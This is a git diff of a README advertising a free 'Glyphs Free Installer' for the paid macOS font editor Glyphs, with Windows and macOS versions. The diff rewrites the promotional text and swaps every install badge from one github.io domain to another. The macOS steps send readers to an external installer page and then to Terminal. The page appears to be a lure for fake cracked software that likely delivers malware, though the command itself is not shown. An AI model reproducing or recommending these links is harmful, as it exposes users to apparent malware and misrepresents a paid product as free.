@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Font+Editor-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Glyphs Free Installer** — Glyphs is a professional macOS font editor designed to make type design accessible and efficient. Works without internet access, no account required. Full offline installation.
+**💻 Glyphs Free Installer** — Glyphs is a macOS font editor celebrated for its intuitive interface and powerful features. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Glyphs](https://img.shields.io/badge/⬇_Install_Glyphs-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Glyphs](https://img.shields.io/badge/⬇_Install_Glyphs-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Glyphs
 
-Glyphs is a professional macOS font editor designed to make type design accessible and efficient. With an intuitive interface, smart components, masters for variable fonts, and a powerful scripting API, Glyphs is trusted by hundreds of professional type designers. Its thoughtful workflow design reduces friction in the type design process from initial sketching to final font export.
+Glyphs is a macOS font editor celebrated for its intuitive interface and powerful features. Used by many professional type foundries, it supports variable fonts, color fonts, smart components, and a rich plugin ecosystem — combining power with approachability.
 
 ---
 
 ## ❌ Problem: Glyphs is hard to access
 
-- **macOS Only** — No Windows or Linux version
-- **Subscription/Purchase Cost** — Paid software with significant upfront cost
-- **Learning Investment** — Professional typography concepts require dedicated study
-- **Plugin Ecosystem** — Best functionality requires third-party plugins
+- **macOS Only** — No Windows or Linux version available
+- **Paid License** — Significant purchase price; Glyphs Mini is a cheaper limited version
+- **Learning Curve** — Type design fundamentals required to use effectively
+- **Niche Audience** — Specifically for type designers; no general graphic design use
 
 ---
 
@@ -61,9 +61,9 @@ Glyphs is a professional macOS font editor designed to make type design accessib
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ Glyphs is a professional macOS font editor designed to make type design accessib
 
 <div align="center">
 
-[![⬇ Install Glyphs](https://img.shields.io/badge/⬇_Install_Glyphs-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Glyphs](https://img.shields.io/badge/⬇_Install_Glyphs-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ Glyphs is a professional macOS font editor designed to make type design accessib
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ Glyphs is a professional macOS font editor designed to make type design accessib
 
 ---
 
-**Glyphs Free Installer** — Glyphs is a professional macOS font editor designed to make type design accessible and efficient. Install without internet connection today!
+**Glyphs Free Installer** — Glyphs is a macOS font editor celebrated for its intuitive interface and powerful features. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Glyphs](https://img.shields.io/badge/⬇_Install_Glyphs-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Glyphs](https://img.shields.io/badge/⬇_Install_Glyphs-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
